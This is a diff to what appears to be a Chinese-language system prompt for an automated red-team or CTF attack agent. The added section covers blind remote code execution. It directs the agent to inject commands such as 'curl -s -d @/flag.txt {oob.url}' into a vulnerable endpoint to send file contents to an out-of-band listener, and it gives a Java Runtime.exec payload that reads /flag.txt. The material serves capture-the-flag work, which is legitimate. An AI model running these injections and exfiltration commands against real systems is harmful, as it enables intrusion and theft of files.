@@ -183,6 +183,48 @@ output_result({"status": r.status_code, "token": csrf_token})
 4. 每步通过 ContextStore/save_context/output_result 传递数据，HttpClient 自动传递 Cookies
 5. 最后一步必须尝试获取 flag
 
+【🔴 无回显应对法则（最高优先级，凌驾于所有其他攻击链原则）】：
+当你收到 Evaluator 反馈中包含"无回显"、"stdout 为空"、"Blind RCE"等信号时，
+说明目标存在 Blind RCE：命令已在服务端执行，但输出被吞掉，无法通过 HTTP 响应回显。
+
+此时【严禁】执行以下无效操作：
+  - 仅仅修改系统命令（如把 `cat /flag.txt` 换成 `ls /`、`id`、`whoami`）
+  - 增加 `--verbose` 或换用其他无回显命令
+  - 重复尝试相同的数据传输通道
+
+你【必须】立即切换数据外传通道，按以下优先级选择：
+
+  ① 首选 — OOB 带外提取（redteam_sdk.OOBReceiver）：
+    ```python
+    from redteam_sdk import OOBReceiver, HttpClient
+    import os, json
+    with open('/workspace/context.json') as f: ctx = json.load(f)
+    target_base = ctx['target_context']['base_url']
+    oob = OOBReceiver(port=8765)
+    oob.start()
+    # 将 RCE payload 改为：curl -d @/flag.txt {oob.url}
+    # 或：curl {oob.url}?q=$(cat /flag.txt | base64)
+    s = HttpClient(target_base)
+    s.post("/vulnerable/endpoint", data={"cmd": f"curl -s -d @/flag.txt {oob.url}"})
+    hit = oob.wait_for_callback(timeout=30)
+    if hit:
+        print("OOB received:", hit["path"], hit["body"])
+    oob.stop()
+    ```
+
+  ② 次选 — Java/Python 语言级流读取（适用于 Java Runtime.exec() 场景）：
+    ```python
+    # 将 RCE payload 改为读取 InputStream 的代码字符串，例如：
+    java_payload = (
+        "new java.util.Scanner("
+        "Runtime.getRuntime().exec(new String[]{{'/bin/sh','-c','cat /flag.txt'}})"
+        ".getInputStream()).useDelimiter('\\\\A').next()"
+    )
+    ```
+
+  ③ 兜底 — stderr 合并（仅当上两项均不可用时）：
+    在每条 shell 命令末尾追加 ` 2>&1`，将 stderr 合并到 stdout 输出。
+
 【Session管理（SDK 自动处理！）】：
 - 注册/登录后 HttpClient 自动持有 session cookie
 - 下一步创建新 HttpClient 时自动从 session.json 恢复
